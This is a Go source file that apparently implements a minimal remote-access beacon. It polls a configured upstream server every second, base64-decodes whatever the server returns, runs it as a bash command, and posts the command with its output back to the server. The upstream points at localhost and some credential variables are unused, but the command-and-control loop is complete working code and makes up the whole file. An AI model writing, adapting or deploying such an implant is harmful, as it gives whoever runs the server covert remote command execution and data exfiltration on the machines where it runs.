package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"
	"time"
)

var USERNAME = "foobar"
var PASSWORD = "foobar"
var UPSTREAM = "http://localhost:8000"
var PAC_URL = ""

var COMMAND_MAP = map[string]func(cmd string) error{
}

func runBashWithTimeout(command string, timeout time.Duration) (stdout string, stderr string, err error) {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, "bash", "-c", command)

	var outBuf, errBuf bytes.Buffer
	cmd.Stdout = &outBuf
	cmd.Stderr = &errBuf

	err = cmd.Run()
	if ctx.Err() == context.DeadlineExceeded {
		return outBuf.String(), errBuf.String(), fmt.Errorf("connection timed out after %v", timeout)
	}

	return outBuf.String(), errBuf.String(), err
}

func main() {
	termSig := make(chan os.Signal, 1)

	signal.Notify(termSig, syscall.SIGINT, syscall.SIGTERM)

	for {
		select {
		case <-termSig:
			return
		default:
			time.Sleep(1 * time.Second)
			resp, err := http.Get(UPSTREAM)
			if err != nil {
				continue
			}

			if (resp.StatusCode == 200) {
				bodyBytes, err := io.ReadAll(resp.Body)
				resp.Body.Close()
				if err != nil {
					continue
				}

				decoded, err := base64.StdEncoding.DecodeString(string(bodyBytes))
				if err != nil {
					continue
				}

				command := string(decoded)
				stdout, stderr, err := runBashWithTimeout(command, 100 * time.Second)
				if err != nil {
					continue
				}
				result := fmt.Sprintf("%s\n\n%s\n\n%s", command, stdout, stderr)
				encoded := base64.StdEncoding.EncodeToString([]byte(result))
				http.Post(UPSTREAM, "text/plain", strings.NewReader(encoded))
			}
		}
	}
}
